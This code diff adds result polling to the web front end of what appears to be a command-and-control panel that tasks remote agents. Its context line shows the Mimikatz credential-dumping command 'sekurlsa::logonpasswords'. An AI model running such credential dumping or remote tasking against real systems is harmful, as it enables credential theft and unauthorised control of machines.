@@ -380,16 +380,36 @@ sekurlsa::logonpasswords</code></pre>
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ command: command })
                     });
+                    const task = await response.json();
                     if (!response.ok) {
                         outputDiv.innerHTML += `Error sending command.\n`;
+                        return;
                     }
-                    // The result will be fetched by the agent and logged on the server side.
-                    // A more advanced version would fetch results here.
+                    outputDiv.innerHTML += `Task ${task.id} sent...\n`;
+                    pollForResult(task.id, outputDiv);
                 } catch (e) {
                     outputDiv.innerHTML += `Error: ${e.toString()}\n`;
                 }
             }
         });
+
+        function pollForResult(taskId, outputDiv) {
+            const interval = setInterval(async () => {
+                try {
+                    const response = await fetch(`/api/tasks/${taskId}`);
+                    if (!response.ok) return;
+                    const task = await response.json();
+                    if (task.status === 'completed') {
+                        clearInterval(interval);
+                        outputDiv.innerHTML += `${escapeHtml(task.result)}\n`;
+                        outputDiv.scrollTop = outputDiv.scrollHeight;
+                    }
+                } catch (e) {
+                    console.error("Error polling for result:", e);
+                    clearInterval(interval);
+                }
+            }, 2000); // Poll every 2 seconds
+        }
 
         setInterval(fetchAgents, 5000); // Fetch agents every 5 seconds
         fetchAgents(); // Initial fetch
